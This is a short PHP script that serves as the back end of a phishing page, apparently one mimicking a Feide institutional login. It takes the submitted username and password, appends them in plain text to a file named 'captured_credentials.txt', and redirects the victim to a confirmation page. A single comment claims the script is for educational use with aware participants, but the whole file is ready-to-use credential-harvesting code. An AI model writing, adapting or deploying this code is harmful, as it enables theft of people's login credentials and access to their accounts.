<?php
// Ensure this is only used for educational purposes and participants are aware

// Get the username and password from the POST request
$username = $_POST['feidename'];
$password = $_POST['password'];

// Log the credentials to a file
file_put_contents("captured_credentials.txt", "Username: " . $username . " Password: " . $password . "\n", FILE_APPEND);

// Redirect to a confirmation page
header('Location: confirmation.html');
exit();
?>
